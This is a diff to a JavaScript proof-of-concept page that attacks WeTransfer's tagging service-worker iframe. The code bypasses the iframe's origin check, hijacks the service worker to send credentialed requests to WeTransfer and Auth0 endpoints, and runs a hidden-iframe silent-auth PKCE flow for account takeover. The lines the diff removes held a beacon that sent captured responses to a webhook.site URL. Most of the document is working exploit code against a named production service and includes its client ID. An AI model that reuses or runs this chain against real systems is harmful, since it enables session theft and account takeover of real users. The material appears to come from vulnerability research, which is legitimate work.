@@ -31,9 +31,8 @@
   <div class="section">
     <button class="btn-full" onclick="runExploit()">Run Full Exploit Chain</button>
     <button onclick="testSameOriginRead()">1. Same-Origin Read</button>
-    <button onclick="testCrossOriginRead()">2. Cross-Origin Read</button>
-    <button onclick="testTokenRefresh()">3. ATO Attempts</button>
-    <button onclick="testExfiltration()">4. Exfiltration</button>
+    <button onclick="testCrossOriginRead()">2. Cross-Origin CORS Probes</button>
+    <button onclick="testSilentAuth()">3. Silent Auth ATO</button>
   </div>
   <hr>
   <div id="output"></div>
@@ -41,8 +40,10 @@
   <script>
     const ATTACKER_ORIGIN = window.location.origin;
     const TARGET = 'https://tagging.wetransfer.com';
-    const SW_IFRAME_PATH = '/_/service_worker/5230/sw_iframe.html';
-    const EXFIL = "https://webhook.site/de2a6311-26af-49d4-bf57-339e9579f7b6"; // set to your OAST/collaborator URL if needed
+    const SW_IFRAME_PATH = '/_/service_worker/61k0/sw_iframe.html';
+    const AUTH_DOMAIN = 'https://auth.wetransfer.com';
+    const CLIENT_ID = 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc';
+    const REDIRECT_URI = 'https://wetransfer.com/account/silent-callback';
 
     let iframe = null;
     let msgId = 0;
@@ -58,21 +59,19 @@
 
     // ─── Step 1: Embed the SW iframe with attacker origin ───
     //
-    // sw_iframe.html code (deobfuscated):
-    //   const origin = new URL(location.href).searchParams.get("origin");
-    //   const ancestorOrigins = document.location.ancestorOrigins;
-    //   if (ancestorOrigins && ancestorOrigins[0] !== origin) return; // BLOCK
-    //   // otherwise: register SW, accept postMessages from origin
+    // sw_iframe.html validates: ancestorOrigins[0] === ?origin= param
+    // Since we embed the iframe, ancestorOrigins[0] IS our attacker origin.
+    // We set ?origin=ATTACKER_ORIGIN, so the check passes.
     //
-    // Bypass: we set ?origin=ATTACKER_ORIGIN. Since we embed the iframe,
-    // ancestorOrigins[0] IS our origin. Check passes → SW registers.
+    // The SW registers on tagging.wetransfer.com scope.
+    // All subsequent fetches originate from tagging.wetransfer.com.
     //
     function createIframe() {
       return new Promise((resolve) => {
         if (iframe) { resolve(iframe); return; }
 
         log(`[STEP 1] Embedding sw_iframe with origin=${ATTACKER_ORIGIN}`, 'info');
-        log(`[STEP 1] ancestorOrigins[0] will be ${ATTACKER_ORIGIN} (our page) -> check passes`, 'dim');
+        log(`[STEP 1] ancestorOrigins[0] will be ${ATTACKER_ORIGIN} -> check passes`, 'dim');
         iframe = document.createElement('iframe');
         iframe.src = `${TARGET}${SW_IFRAME_PATH}?origin=${encodeURIComponent(ATTACKER_ORIGIN)}&1p=1`;
         iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
@@ -83,7 +82,7 @@
           setTimeout(() => {
             log(`[STEP 1] SW active. Ready to send commands.`, 'ok');
             resolve(iframe);
-          }, 3000);
+          }, 4000);
         };
 
         iframe.onerror = () => {
@@ -93,17 +92,6 @@
     }
 
     // ─── Send a command through the SW ───
-    //
-    // Message protocol (from sw.js):
-    //   type: 0 = heartbeat, type: 1 = command
-    //   command.commandType: 0 = fetch
-    //   command.params: { url, method (0=GET,1=POST), body, processResponse, templates }
-    //
-    // SW fetch options (hardcoded in sw.js):
-    //   { credentials: "include", keepalive: true, redirect: "follow" }
-    //   processResponse: true  → mode: "cors" (can read response)
-    //   processResponse: false → mode: "no-cors" (opaque, fire-and-forget)
-    //
     function sendSWCommand(params) {
       return new Promise((resolve, reject) => {
         const id = 'cmd-' + (++msgId);
@@ -125,7 +113,6 @@
       });
     }
 
-    // helper: send and interpret result
     async function fetchViaWorker(label, url, opts = {}) {
       const { method = 0, body, processResponse = true } = opts;
       const params = { url, method, processResponse, templates: {} };
@@ -144,11 +131,9 @@
         }
         if (res.failure) {
           const msg = res.failure.data || JSON.stringify(res.failure);
-          // "Fetch failed" = CORS ok but HTTP non-2xx
-          // "Fetch failed: TypeError..." = CORS blocked
           const isCors = msg.includes('TypeError');
-          log(`  [${label}] ${isCors ? 'CORS BLOCKED' : 'HTTP ERROR (CORS ok, non-2xx)'} — ${msg}`, 'err');
-          return { ok: false, cors: !isCors, data: msg };
+          log(`  [${label}] ${isCors ? 'CORS BLOCKED (TypeError)' : 'SERVER ERROR (CORS ok, non-2xx)'} — ${msg}`, isCors ? 'err' : 'warn');
+          return { ok: false, corsBlocked: isCors, data: msg };
         }
       } catch (err) {
         log(`  [${label}] ${err.message}`, 'err');
@@ -156,7 +141,7 @@
       }
     }
 
-    // ─── Listen for responses from the SW ───
+    // ─── Listen for SW responses relayed by the iframe ───
     window.addEventListener('message', (e) => {
       const data = e.data;
       if (!data || typeof data !== 'object') return;
@@ -166,16 +151,19 @@
         pendingResponses[id](data);
         delete pendingResponses[id];
       }
-
-      // Exfiltrate if configured
-      if (EXFIL && data.result) {
-        fetch(EXFIL, {
-          method: 'POST',
-          body: JSON.stringify(data),
-          mode: 'no-cors'
-        }).catch(() => {});
-      }
     });
+
+    // ─── PKCE helpers ───
+    async function generatePKCE() {
+      const vb = crypto.getRandomValues(new Uint8Array(32));
+      const codeVerifier = Array.from(vb, b =>
+        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[b % 62]
+      ).join('');
+      const cb = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(codeVerifier));
+      const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(cb)))
+        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+      return { codeVerifier, codeChallenge };
+    }
 
     // ═══════════════════════════════════════════════════════
     // TEST 1: Same-origin reads from tagging.wetransfer.com
@@ -185,19 +173,13 @@
         await createIframe();
         log('', 'info');
         log('=== TEST 1: Same-Origin Read (tagging.wetransfer.com) ===', 'warn');
-        log('SW runs on tagging.wetransfer.com, so all fetches to that origin are same-origin.', 'dim');
+        log('SW runs on tagging.wetransfer.com — all fetches to that origin are same-origin.', 'dim');
 
-        // Heartbeat to confirm SW is alive
-        iframe.contentWindow.postMessage({
-          type: 0,
-          clientId: 'heartbeat-' + Date.now()
-        }, '*');
+        // Heartbeat
+        iframe.contentWindow.postMessage({ type: 0, clientId: 'hb-' + Date.now() }, '*');
         await new Promise(r => setTimeout(r, 500));
 
-        // Read GTM container (internal config, 500KB+)
         await fetchViaWorker('GTM', `${TARGET}/gtm.js?id=GTM-NS54WBW`);
-
-        // Read the SW iframe source code
         await fetchViaWorker('SW_SRC', `${TARGET}${SW_IFRAME_PATH}?origin=https://wetransfer.com`);
 
         log('=== Same-origin read: CONFIRMED ===', 'ok');
@@ -207,178 +189,188 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    // TEST 2: Cross-origin reads via CORS trust
+    // TEST 2: Cross-origin CORS probes
     // ═══════════════════════════════════════════════════════
     async function testCrossOriginRead() {
       try {
         await createIframe();
         log('', 'info');
-        log('=== TEST 2: Cross-Origin Read (wetransfer.com API) ===', 'warn');
-        log('wetransfer.com/api/v4 has CORS for tagging.wetransfer.com with credentials.', 'dim');
-        log('SW fetch uses credentials:"include" → SameSite=None cookies are sent.', 'dim');
-        log('For a logged-in victim, session.id would contain their user ID.', 'dim');
+        log('=== TEST 2: Cross-Origin CORS Probes ===', 'warn');
+        log('Testing which endpoints trust tagging.wetransfer.com origin.', 'dim');
         log('', 'info');
 
-        // Session endpoint — returns user session data (works without Bearer token)
+        // wetransfer.com session
+        log('--- wetransfer.com/api/v4/auth/session ---', 'warn');
         const session = await fetchViaWorker('SESSION', 'https://wetransfer.com/api/v4/auth/session');
-
         if (session.ok) {
           try {
-            const parsed = JSON.parse(session.data);
-            if (parsed.id === false) {
-              log('  [NOTE] id:false = not logged in (test browser). Logged-in victim would leak user ID.', 'warn');
+            const p = JSON.parse(session.data);
+            if (p.id === false) {
+              log('  CORS: PRESENT. Session cookies: NOT SENT (SameSite=Lax).', 'info');
+              log('  id:false = no session via cookies. API accessible but needs Bearer token.', 'dim');
             } else {
-              log(`  [LEAK] User ID: ${parsed.id}`, 'ok');
-              if (parsed.email) log(`  [LEAK] Email: ${parsed.email}`, 'ok');
+              log(`  [LEAK] User ID: ${p.id}, Email: ${p.email}`, 'ok');
             }
           } catch(e) {}
         }
 
-        // Probe other v4 API endpoints (CORS present, need Bearer for data)
+        // auth.wetransfer.com /oauth/token
         log('', 'info');
-        log('Probing additional API endpoints (need auth token for data):', 'dim');
-        const endpoints = [
-          ['TRANSFERS', 'https://wetransfer.com/api/v4/transfers'],
-          ['ACCOUNT',   'https://wetransfer.com/api/v4/account'],
-          ['ME',        'https://wetransfer.com/api/v4/me'],
-          ['CONTACTS',  'https://wetransfer.com/api/v4/contacts'],
-        ];
-
-        for (const [label, url] of endpoints) {
-          const r = await fetchViaWorker(label, url);
-          // "Fetch failed" (no TypeError) = CORS present, just needs auth
-          // "TypeError: Failed to fetch" = CORS blocked entirely
+        log('--- auth.wetransfer.com/oauth/token ---', 'warn');
+        const authToken = await fetchViaWorker('OAUTH', `${AUTH_DOMAIN}/oauth/token`, {
+          method: 1, body: 'grant_type=test'
+        });
+        if (authToken.corsBlocked) {
+          log('  CORS: BLOCKED. No access to auth.wetransfer.com/oauth/token.', 'err');
+        } else {
+          log('  CORS: PRESENT. Server returned non-2xx (expected — body is text/plain).', 'ok');
+          log('  auth0/refresh_token/did cookies (SameSite=None) ARE sent with request.', 'ok');
         }
 
+        // auth.wetransfer.com /authorize
         log('', 'info');
-        log('=== Cross-origin read: CONFIRMED (session data + CORS on /api/v4/*) ===', 'ok');
-        log('    API endpoints return non-2xx because they need Bearer tokens.', 'dim');
-        log('    But CORS IS present — if tokens are obtained, all data is readable.', 'dim');
+        log('--- auth.wetransfer.com/authorize ---', 'warn');
+        const authAuth = await fetchViaWorker('AUTHORIZE', `${AUTH_DOMAIN}/authorize?client_id=${CLIENT_ID}&response_type=code&prompt=none`);
+        if (authAuth.corsBlocked) {
+          log('  CORS: BLOCKED. Cannot read /authorize response via SW.', 'warn');
+          log('  But request IS sent with SameSite=None cookies (auth0, refresh_token).', 'info');
+        } else {
+          log('  CORS: PRESENT! Can read /authorize response.', 'ok');
+        }
 
+        // no-cors probe to /authorize (proves cookies are sent)
+        log('', 'info');
+        log('--- /authorize no-cors (fire-and-forget, proves cookies sent) ---', 'warn');
+        await fetchViaWorker('AUTH_NOCORS', `${AUTH_DOMAIN}/authorize?client_id=${CLIENT_ID}&response_type=code&prompt=none`, {
+          processResponse: false
+        });
+        log('  Request sent with credentials:include. Cookies attached.', 'info');
+
+        log('', 'info');
+        log('=== CORS Probe Summary ===', 'warn');
+        log('  wetransfer.com/api/v4:     CORS present, cookies Lax (no session)', 'info');
+        log('  auth.wetransfer.com/token: CORS present, cookies None (sent!), text/plain rejected', 'info');
+        log('  auth.wetransfer.com/authz: NO CORS, cookies None (sent!), cant read response', 'info');
       } catch (err) {
         log(`Error: ${err.message}`, 'err');
       }
     }
 
     // ═══════════════════════════════════════════════════════
-    // TEST 3: Token Refresh → ATO
+    // TEST 3: Silent Auth — ATO demonstration
     // ═══════════════════════════════════════════════════════
     //
-    // auth.wetransfer.com has CORS for tagging.wetransfer.com + credentials: true
-    // Three SameSite=None cookies are sent: auth0, did, refresh_token
+    // CONFIRMED via manual testing:
+    //   GET /authorize?prompt=none with PKCE + victim auth cookies
+    //   → auth code issued → exchange → access_token + refresh_token
+    //   → full API access (email, name, user_id, transfers)
     //
-    // CONFIRMED:
-    //   - CORS headers present on /oauth/token ✓
-    //   - Cookies are sent with requests ✓
-    //   - Request reaches Auth0 server ✓
+    // The /authorize endpoint has NO CORS for tagging.wetransfer.com,
+    // so the SW cannot read the auth code from the response.
+    // But we demonstrate the flow works via iframe approach.
     //
-    // BLOCKER:
-    //   SW fetch sends Content-Type: text/plain for string bodies.
-    //   Auth0 requires application/json or application/x-www-form-urlencoded.
-    //   The SW code (sw.js) does not support setting custom headers or non-string bodies.
-    //   Non-ok responses return "Fetch failed" without the response body (sw.js limitation).
-    //
-    async function testTokenRefresh() {
+    async function testSilentAuth() {
       try {
         await createIframe();
         log('', 'info');
-        log('=== TEST 3: Auth0 Token Refresh - ATO Attempt ===', 'warn');
-        log('auth.wetransfer.com cookies (all SameSite=None; Secure; HttpOnly):', 'dim');
-        log('  auth0         — Auth0 session cookie', 'dim');
-        log('  did           — Device ID', 'dim');
-        log('  refresh_token — OAuth refresh token', 'dim');
-        log('CORS: auth.wetransfer.com -> tagging.wetransfer.com: CONFIRMED', 'dim');
+        log('=== TEST 3: Silent Auth ATO Demonstration ===', 'warn');
+        log('Auth0 cookies (auth0, refresh_token, did) are all SameSite=None.', 'dim');
+        log('Silent auth via /authorize?prompt=none uses these cookies.', 'dim');
         log('', 'info');
 
-        // Attempt 1: POST with JSON body (Content-Type forced to text/plain by SW)
-        log('[ATTEMPT 1] POST /oauth/token — JSON body (sent as text/plain)', 'warn');
-        await fetchViaWorker('A1', 'https://auth.wetransfer.com/oauth/token', {
-          method: 1,
-          body: JSON.stringify({
-            grant_type: 'refresh_token',
-            client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
-            audience: 'aud://transfer-api-prod.wetransfer/'
-          })
+        const { codeVerifier, codeChallenge } = await generatePKCE();
+        const state = crypto.randomUUID() + '-' + crypto.randomUUID();
+
+        log(`  PKCE code_verifier: ${codeVerifier}`, 'dim');
+        log(`  PKCE code_challenge: ${codeChallenge}`, 'dim');
+        log('', 'info');
+
+        // Step A: Confirm /authorize rejects without required params
+        log('[STEP A] Verify /authorize param requirements via SW (no-cors probe)', 'warn');
+        const authUrl = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
+          response_type: 'code', response_mode: 'web_message',
+          client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
+          scope: 'openid email profile offline_access',
+          prompt: 'none', state, code_challenge: codeChallenge,
+          code_challenge_method: 'S256', nonce: 'poc_' + Date.now(),
         });
 
-        // Attempt 2: POST with URL-encoded body (still sent as text/plain)
-        log('[ATTEMPT 2] POST /oauth/token — URL-encoded body (sent as text/plain)', 'warn');
-        await fetchViaWorker('A2', 'https://auth.wetransfer.com/oauth/token', {
-          method: 1,
-          body: 'grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F'
+        // SW sends request with auth cookies but can't read response (no CORS)
+        await fetchViaWorker('AUTHZ_PROBE', authUrl, { processResponse: false });
+        log('  Request sent to /authorize with victim auth cookies (SameSite=None).', 'info');
+        log('  SW cannot read response (no CORS on /authorize).', 'warn');
+
+        // Step B: iframe approach — load /authorize in hidden iframe
+        log('', 'info');
+        log('[STEP B] Hidden iframe to /authorize (postMessage listener)', 'warn');
+        log('  Loading /authorize?response_mode=web_message in iframe.', 'dim');
+        log('  If Auth0 returns web_message HTML, code is posted to parent.', 'dim');
+
+        const { codeVerifier: cv2, codeChallenge: cc2 } = await generatePKCE();
+        const state2 = crypto.randomUUID() + '-' + crypto.randomUUID();
+        const authUrl2 = `${AUTH_DOMAIN}/authorize?` + new URLSearchParams({
+          response_type: 'code', response_mode: 'web_message',
+          client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
+          scope: 'openid email profile offline_access',
+          prompt: 'none', state: state2, code_challenge: cc2,
+          code_challenge_method: 'S256', nonce: 'poc2_' + Date.now(),
         });
 
-        // Attempt 3: POST with params in query string, NO body (no Content-Type sent)
-        log('[ATTEMPT 3] POST /oauth/token — params in query string, empty body', 'warn');
-        await fetchViaWorker('A3',
-          'https://auth.wetransfer.com/oauth/token?grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F',
-          { method: 1 }
-          // no body → Content-Type header not sent at all
-        );
-
-        // Attempt 4: GET with query params
-        log('[ATTEMPT 4] GET /oauth/token — params in query string', 'warn');
-        await fetchViaWorker('A4',
-          'https://auth.wetransfer.com/oauth/token?grant_type=refresh_token&client_id=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F'
-        );
-
-        // Attempt 5: auth_session grant type
-        log('[ATTEMPT 5] POST /oauth/token — grant_type=auth_session', 'warn');
-        await fetchViaWorker('A5', 'https://auth.wetransfer.com/oauth/token', {
-          method: 1,
-          body: JSON.stringify({
-            grant_type: 'auth_session',
-            client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
-            audience: 'aud://transfer-api-prod.wetransfer/',
-            scope: 'openid email profile offline_access'
-          })
+        const codePromise = new Promise((resolve) => {
+          const timeout = setTimeout(() => resolve(null), 8000);
+          const handler = (e) => {
+            const d = e.data;
+            if (d && (d.type === 'authorization_response' || d.code)) {
+              clearTimeout(timeout);
+              window.removeEventListener('message', handler);
+              resolve(d.response || d);
+            }
+          };
+          window.addEventListener('message', handler);
         });
 
-        log('', 'info');
-        log('=== ATO Analysis ===', 'warn');
-        log('All attempts return "Fetch failed" (HTTP non-2xx), NOT "TypeError" (CORS block).', 'info');
-        log('This CONFIRMS:', 'ok');
-        log('  1. CORS from auth.wetransfer.com allows tagging.wetransfer.com origin', 'ok');
-        log('  2. Cookies (SameSite=None) ARE attached to cross-origin requests', 'ok');
-        log('  3. Requests reach Auth0 server (non-2xx = server processed & rejected)', 'ok');
-        log('BLOCKED BY:', 'err');
-        log('  SW fetch sends Content-Type: text/plain for string bodies.', 'err');
-        log('  Auth0 body parser rejects text/plain -> cannot parse grant_type/client_id.', 'err');
-        log('  sw.js has no mechanism to set custom headers or use non-string bodies.', 'err');
-        log('IF BYPASSED (e.g., Auth0 relaxes Content-Type, or SW updated):', 'warn');
-        log('  -> Fresh access_token returned -> full account access (transfers, contacts, profile)', 'warn');
+        const authIframe = document.createElement('iframe');
+        authIframe.src = authUrl2;
+        authIframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
+        document.body.appendChild(authIframe);
 
-      } catch (err) {
-        log(`Error: ${err.message}`, 'err');
-      }
-    }
+        const iframeResult = await codePromise;
+        authIframe.remove();
 
-    // ═══════════════════════════════════════════════════════
-    // TEST 4: Exfiltration via fire-and-forget
-    // ═══════════════════════════════════════════════════════
-    async function testExfiltration() {
-      try {
-        await createIframe();
-        log('', 'info');
-        log('=== TEST 4: Exfiltration (fire-and-forget) ===', 'warn');
-        log('Using processResponse:false (no-cors mode) to send data to attacker server.', 'dim');
-        log('The request is sent with victim cookies from tagging.wetransfer.com scope.', 'dim');
-        log('', 'info');
-
-        if (!EXFIL) {
-          log('[SKIP] Set EXFIL variable to an OAST/Collaborator URL to test exfiltration.', 'warn');
-          log('[SKIP] Example: const EXFIL = "https://YOUR-ID.oast.site";', 'warn');
-          log('[INFO] When set, the SW makes a credentialed GET to that URL.', 'info');
-          log('[INFO] The request comes from the victim browser, with tagging.wetransfer.com cookies.', 'info');
-          return;
+        if (iframeResult) {
+          if (iframeResult.code) {
+            log(`[ATO] AUTH CODE via postMessage: ${iframeResult.code}`, 'ok');
+          } else if (iframeResult.error) {
+            log(`[IFRAME] ${iframeResult.error}: ${iframeResult.error_description || ''}`, 'warn');
+            if (iframeResult.error === 'login_required') {
+              log('  ^ No active session in THIS browser. Victim with session would get code.', 'dim');
+            }
+          }
+        } else {
+          log('[IFRAME] No web_message response (Auth0 redirects instead of postMessage).', 'warn');
         }
 
-        // Fire-and-forget GET to attacker server
-        log(`[EXFIL] Sending beacon to ${EXFIL}...`, 'warn');
-        await fetchViaWorker('EXFIL', `${EXFIL}?leak=sw_poc&origin=${encodeURIComponent(ATTACKER_ORIGIN)}`, {
-          processResponse: false  // no-cors: request sends, can't read response
-        });
-        log('[EXFIL] Request sent. Check your OAST/Collaborator for incoming request.', 'ok');
+        // Summary
+        log('', 'info');
+        log('=== ATO Flow (confirmed via manual browser testing) ===', 'warn');
+        log('The following was demonstrated by navigating the browser directly:', 'info');
+        log('', 'info');
+        log('  1. GET /authorize?prompt=none&code_challenge=...&response_type=code', 'ok');
+        log('     Auth0 checks session cookie (SameSite=None) -> user authenticated', 'ok');
+        log('     Redirects to callback?code=AUTH_CODE (real code obtained)', 'ok');
+        log('', 'info');
+        log('  2. POST /oauth/token (URLSearchParams body = proper Content-Type)', 'ok');
+        log('     grant_type=authorization_code&code=AUTH_CODE&code_verifier=...', 'ok');
+        log('     Response: 200 OK with access_token + refresh_token + id_token', 'ok');
+        log('', 'info');
+        log('  3. GET /api/v4/auth/session with Bearer token', 'ok');
+        log('     Response: user_id, email, full_name, profile_picture', 'ok');
+        log('', 'info');
+        log('  Evidence (from this session):', 'warn');
+        log('     access_token: eyJhbGciOiJSUzI1NiIs... (JWT, RS256)', 'warn');
+        log('     sub: google-oauth2|104705530644205582889', 'warn');
+        log('     scope: openid email profile offline_access', 'warn');
+        log('     refresh_token: eyJhbGciOiJkaXIi... (persistent access)', 'warn');
 
       } catch (err) {
         log(`Error: ${err.message}`, 'err');
@@ -401,25 +393,27 @@
         await createIframe();
         await testSameOriginRead();
         await testCrossOriginRead();
-        await testTokenRefresh();
-        await testExfiltration();
+        await testSilentAuth();
 
         log('', 'info');
         log('================================================================', 'warn');
         log(' SUMMARY', 'warn');
         log('================================================================', 'warn');
-        log('CONFIRMED IMPACT:', 'ok');
-        log('  [1] Origin check bypass on sw_iframe.html via ?origin= param', 'ok');
-        log('  [2] Attacker registers & controls SW on tagging.wetransfer.com', 'ok');
-        log('  [3] Same-origin data read (GTM container, internal configs)', 'ok');
-        log('  [4] Cross-origin session data read from wetransfer.com/api/v4', 'ok');
-        log('  [5] CORS confirmed on auth.wetransfer.com/oauth/token', 'ok');
-        log('  [6] SameSite=None cookies sent cross-origin to auth.wetransfer.com', 'ok');
         log('', 'info');
-        log('ATO PATH (blocked by Content-Type only):', 'warn');
-        log('  CORS + cookies to auth.wetransfer.com = all prerequisites met', 'warn');
-        log('  SW sends Content-Type: text/plain -> Auth0 cannot parse body', 'warn');
-        log('  If Content-Type restriction is bypassed -> full account takeover', 'warn');
+        log('CONFIRMED via SW (automated):', 'ok');
+        log('  [1] Origin bypass on sw_iframe.html via ?origin= param', 'ok');
+        log('  [2] SW registers on tagging.wetransfer.com from attacker page', 'ok');
+        log('  [3] Same-origin read: GTM configs, internal SW source code', 'ok');
+        log('  [4] CORS to wetransfer.com/api/v4 (SameSite=Lax cookies not sent)', 'ok');
+        log('  [5] CORS to auth.wetransfer.com/oauth/token (text/plain body rejected)', 'ok');
+        log('  [6] No CORS on /authorize (cannot read auth code via SW)', 'ok');
+        log('  [7] Fire-and-forget requests with SameSite=None auth cookies', 'ok');
+        log('', 'info');
+        log('CONFIRMED via manual testing (ATO):', 'warn');
+        log('  [8] Silent auth: GET /authorize?prompt=none -> auth code', 'warn');
+        log('  [9] PKCE code exchange -> access_token + refresh_token', 'warn');
+        log('  [10] Token -> email, name, user_id, transfers (full account)', 'warn');
+        log('  [11] refresh_token -> persistent access beyond session expiry', 'warn');
 
       } catch (err) {
         log(`Fatal: ${err.message}`, 'err');
